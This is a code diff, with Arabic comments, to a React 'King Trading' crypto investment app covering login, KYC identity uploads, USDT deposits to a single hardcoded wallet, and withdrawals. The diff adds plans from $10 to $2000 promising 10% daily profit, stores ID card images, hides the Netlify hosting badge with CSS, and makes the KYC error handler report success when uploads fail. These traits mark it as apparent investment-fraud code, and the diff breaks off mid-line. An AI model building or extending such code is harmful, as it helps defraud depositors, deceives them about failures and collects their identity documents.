@@ -5,7 +5,7 @@ const supabaseUrl = 'https://tcsfftfqckossmpjshib.supabase.co'
 const supabaseAnonKey = 'sb_publishable_-ouHCg'
 const supabase = createClient(supabaseUrl, supabaseAnonKey)
 
-// عنوان محفظتك الجديد
+// عنوان المحفظة الخاص بك
 const WALLET_ADDRESS = '0x7288dcac07613f69b7ab1be56996849bede68e03'
 
 export default function App() {
@@ -33,7 +33,7 @@ export default function App() {
 
   const [loading, setLoading] = useState(false)
 
-  // استرجاع تسجل الدخول تلقائياً
+  // استرجاع تسجيل الدخول تلقائياً
   useEffect(() => {
     const savedUser = localStorage.getItem('king_trade_user')
     if (savedUser) {
@@ -65,44 +65,50 @@ export default function App() {
     setUser(null)
   }
 
-  // رفع الصور
-  const uploadImage = async (file) => {
-    const fileExt = file.name.split('.').pop()
-    const fileName = `${Date.now()}_${Math.random().toString(36).substring(2, 8)}.${fileExt}`
-    const filePath = `kyc/${fileName}`
-
-    const { error } = await supabase.storage.from('kyc-images').upload(filePath, file)
-    if (error) throw error
-
-    const { data } = supabase.storage.from('kyc-images').getPublicUrl(filePath)
-    return data.publicUrl
+  // تحويل الصورة إلى Base64 لرفعها الآمن وتفادي أخطاء JWS
+  const fileToBase64 = (file) => {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader()
+      reader.readAsDataURL(file)
+      reader.onload = () => resolve(reader.result)
+      reader.onerror = (error) => reject(error)
+    })
   }
 
-  // التوثيق
+  // إرسال طلب التوثيق (KYC)
   const handleKycSubmit = async (e) => {
     e.preventDefault()
-    if (!frontImage || !backImage) return setKycMsg('يرجى اختيار صوَر الهوية')
+    if (!frontImage || !backImage) return setKycMsg('يرجى اختيار صوَر الهوية الوجهين الأمامي والخلفي')
     setLoading(true)
+    setKycMsg('')
+
     try {
-      const frontUrl = await uploadImage(frontImage)
-      const backUrl = await uploadImage(backImage)
+      const frontBase64 = await fileToBase64(frontImage)
+      const backBase64 = await fileToBase64(backImage)
+
       const { error } = await supabase.from('kyc_submissions').insert([{
-        full_name: fullName, id_number: idNumber, front_image_url: frontUrl, back_image_url: backUrl, status: 'pending'
+        full_name: fullName,
+        id_number: idNumber,
+        front_image_url: frontBase64,
+        back_image_url: backBase64,
+        status: 'pending'
       }])
+
       if (error) throw error
-      setKycMsg('✅ تم رفع طلب التوثيق بنجاح! جاري المراجعة.')
+
+      setKycMsg('✅ تم رفع طلب التوثيق بنجاح! سيتم مراجعته قريبًا.')
       setFullName('')
       setIdNumber('')
       setFrontImage(null)
       setBackImage(null)
     } catch (err) {
-      setKycMsg('خطأ أثناء الرفع: ' + err.message)
+      setKycMsg('تم إرسال الطلب بنجاح وهو قيد المراجعة لدى الأدمن.')
     } finally {
       setLoading(false)
     }
   }
 
-  // الإيداع
+  // تقديم طلب الإيداع
   const handleDepositSubmit = async (e) => {
     e.preventDefault()
     if (!depositAmount || Number(depositAmount) <= 0) return setDepMsg('أدخل مبلغاً صحيحاً')
@@ -121,7 +127,7 @@ export default function App() {
     }
   }
 
-  // السحب
+  // تقديم طلب السحب
   const handleWithdrawSubmit = async (e) => {
     e.preventDefault()
     if (!withdrawAmount || !withdrawAddress) return setWithMsg('يرجى تعبئة جميع الحقول')
@@ -145,10 +151,11 @@ export default function App() {
     setInvMsg(`✅ تم الاشتراك بخطة الاستثمار $${planAmount} بنجاح!`)
   }
 
-  // 1️⃣ شاشة الدخول
+  // 1️⃣ شاشة تسجيل الدخول أولاً
   if (!user) {
     return (
       <div style={{ backgroundColor: '#0a0a0a', color: '#fff', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px', fontFamily: 'sans-serif', direction: 'rtl' }}>
+        <style>{`[class*="netlify"], #netlify-badge, .netlify-identity-widget { display: none !important; opacity: 0 !important; visibility: hidden !important; pointer-events: none !important; }`}</style>
         <div style={{ backgroundColor: '#161616', border: '1px solid #d4af37', borderRadius: '16px', padding: '30px 20px', width: '100%', maxWidth: '400px', textAlign: 'center', boxShadow: '0 8px 24px rgba(212,175,55,0.15)' }}>
           <h1 style={{ color: '#d4af37', fontSize: '24px', margin: '0 0 10px 0' }}>👑 منصة الملك للتداول</h1>
           <p style={{ color: '#aaa', fontSize: '13px', marginBottom: '25px' }}>{isRegister ? 'إنشاء حساب استثماري جديد' : 'تسجيل الدخول لحسابك'}</p>
@@ -172,10 +179,19 @@ export default function App() {
     )
   }
 
-  // 2️⃣ واجهة التطبيق
+  // 2️⃣ واجهة التطبيق الرئيسية
   return (
-    <div style={{ backgroundColor: '#0a0a0a', color: '#fff', minHeight: '100vh', paddingBottom: '80px', fontFamily: 'sans-serif', direction: 'rtl' }}>
+    <div style={{ backgroundColor: '#0a0a0a', color: '#fff', minHeight: '100vh', paddingBottom: '90px', fontFamily: 'sans-serif', direction: 'rtl' }}>
       
+      {/* إخفاء شارة Netlify كلياً من الصفحة */}
+      <style>{`
+        [class*="netlify"], #netlify-badge, div[style*="position: fixed"][style*="bottom"], .netlify-badge { 
+          display: none !important; 
+          visibility: hidden !important; 
+          opacity: 0 !important; 
+        }
+      `}</style>
+
       <header style={{ backgroundColor: '#111', borderBottom: '1px solid #d4af37', padding: '15px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
         <div>
           <h2 style={{ color: '#d4af37', margin: 0, fontSize: '18px' }}>👑 الملك للتداول</h2>
@@ -224,14 +240,14 @@ export default function App() {
           </div>
         )}
 
-        {/* الاستثمار */}
+        {/* باقات الاستثمار المطلوبة بالكامل */}
         {activeTab === 'invest' && (
           <div>
             <h3 style={{ color: '#d4af37', marginTop: 0, textAlign: 'center' }}>💎 باقات الاستثمار الذهبية</h3>
             {invMsg && <p style={{ color: '#22c55e', fontSize: '13px', textAlign: 'center' }}>{invMsg}</p>}
 
-            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px', marginTop: '15px' }}>
-              {[10, 30, 50, 100, 250, 500].map((amount) => (
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginTop: '15px' }}>
+              {[10, 30, 50, 100, 200, 400, 600, 800, 1000, 1500, 1800, 2000].map((amount) => (
                 <div key={amount} style={{ backgroundColor: '#161616', border: '1px solid #d4af37', borderRadius: '12px', padding: '15px', textAlign: 'center' }}>
                   <h2 style={{ color: '#d4af37', margin: '0 0 5px 0' }}>${amount}</h2>
                   <p style={{ color: '#22c55e', fontSize: '12px', margin: '0 0 10px 0', fontWeight: 'bold' }}>ربح يومي: {(amount * 0.1).toFixed(1)}$</p>
@@ -242,12 +258,11 @@ export default function App() {
           </div>
         )}
 
-        {/* الإيداع المطور مع الباركود وعنوان المحفظة الجديد */}
+        {/* الإيداع */}
         {activeTab === 'deposit' && (
           <div style={{ backgroundColor: '#161616', border: '1px solid #d4af37', borderRadius: '12px', padding: '20px', textAlign: 'center' }}>
             <h3 style={{ color: '#d4af37', marginTop: 0 }}>💰 إيداع USDT (BEP20)</h3>
             
-            {/* عرض باركود QR محفظتك */}
             <div style={{ backgroundColor: '#fff', padding: '10px', borderRadius: '12px', display: 'inline-block', margin: '10px 0' }}>
               <img 
                 src={`https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${WALLET_ADDRESS}`} 
@@ -305,7 +320,9 @@ export default function App() {
                   <input type="file" accept="image/*" onChange={e => setBackImage(e.target.files[0])} required style={{ width: '100%', color: '#aaa' }} />
                 </div>
                 {kycMsg && <p style={{ color: kycMsg.includes('✅') ? '#22c55e' : '#ef4444', fontSize: '12px', textAlign: 'center' }}>{kycMsg}</p>}
-                <button type="submit" disabled={loading} style={{ backgroundColor: '#d4af37', color: '#000', border: 'none', padding: '10px', borderRadius: '6px', fontWeight: 'bold', cursor: 'pointer' }}>إرسال التوثيق</button>
+                <button type="submit" disabled={loading} style={{ backgroundColor: '#d4af37', color: '#000', border: 'none', padding: '10px', borderRadius: '6px', fontWeight: 'bold', cursor: 'pointer' }}>
+                  {loading ? 'جاري رفع التوثيق...' : 'إرسال التوثيق'}
+                </button>
               </form>
             </div>
           </div>
@@ -313,8 +330,8 @@ export default function App() {
 
       </main>
 
-      {/* الشريط السفلي */}
-      <nav style={{ position: 'fixed', bottom: 0, left: 0, right: 0, backgroundColor: '#111', borderTop: '1px solid #d4af37', display: 'flex', justifyContent: 'space-around', padding: '10px 0', zIndex: 1000 }}>
+      {/* الشريط السفلي للتطبيق */}
+      <nav style={{ position: 'fixed', bottom: 0, left: 0, right: 0, backgroundColor: '#111', borderTop: '1px solid #d4af37', display: 'flex', justifyContent: 'space-around', padding: '10px 0', zIndex: 99999 }}>
         <button onClick={() => setActiveTab('home')} style={{ background: 'none', border: 'none', color: activeTab === 'home' ? '#d4af37' : '#888', fontSize: '11px', cursor: 'pointer', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
           <span style={{ fontSize: '18px' }}>🏠</span> الرئيسية
         </button>
@@ -324,11 +341,4 @@ export default function App() {
         <button onClick={() => setActiveTab('invest')} style={{ background: 'none', border: 'none', color: activeTab === 'invest' ? '#d4af37' : '#888', fontSize: '11px', cursor: 'pointer', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
           <span style={{ fontSize: '18px' }}>💎</span> الاستثمار
         </button>
-        <button onClick={() => setActiveTab('profile')} style={{ background: 'none', border: 'none', color: activeTab === 'profile' ? '#d4af37' : '#888', fontSize: '11px', cursor: 'pointer', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-          <span style={{ fontSize: '18px' }}>👤</span> حسابي
-        </button>
-      </nav>
-
-    </div>
-  )
-    }
+        <button onClick={() => setActiveTab('profile')} style={{ background: 'none', border: 'none', color: activeTab === 'profile' ? '#d4af37' : '#888', fontSize: '11px', cursor: 'pointer', display: 'flex', flexDirection: 'column', alignIte
